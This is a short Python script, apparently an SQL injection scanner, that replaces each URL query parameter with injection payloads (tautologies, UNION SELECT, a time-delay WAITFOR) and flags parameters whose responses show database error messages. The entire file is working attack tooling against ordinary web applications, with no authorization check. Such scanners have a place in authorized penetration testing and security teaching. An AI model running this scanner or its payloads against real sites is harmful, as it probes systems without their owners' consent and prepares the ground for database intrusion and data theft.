import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# SQL Injection payloads to test
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "' UNION SELECT NULL-- ",
    "'; WAITFOR DELAY '0:0:5'--",
    "\" OR \"1\"=\"1",
]

# SQL error message patterns
ERROR_PATTERNS = [
    r"you have an error in your sql syntax;",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\): query failed:",
]

def is_vulnerable(response_text):
    for pattern in ERROR_PATTERNS:
        if re.search(pattern, response_text, re.I):
            return True
    return False

def scan_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    vulnerable_params = []

    for param in params:
        for payload in PAYLOADS:
            # Inject payload into one param at a time
            params_copy = params.copy()
            params_copy[param] = [payload]

            new_query = urlencode(params_copy, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            try:
                res = requests.get(new_url, timeout=10)
                if is_vulnerable(res.text):
                    vulnerable_params.append({
                        'param': param,
                        'payload': payload,
                        'url': new_url
                    })
                    break
            except Exception as e:
                print(f"Error scanning {new_url}: {e}")

    return vulnerable_params
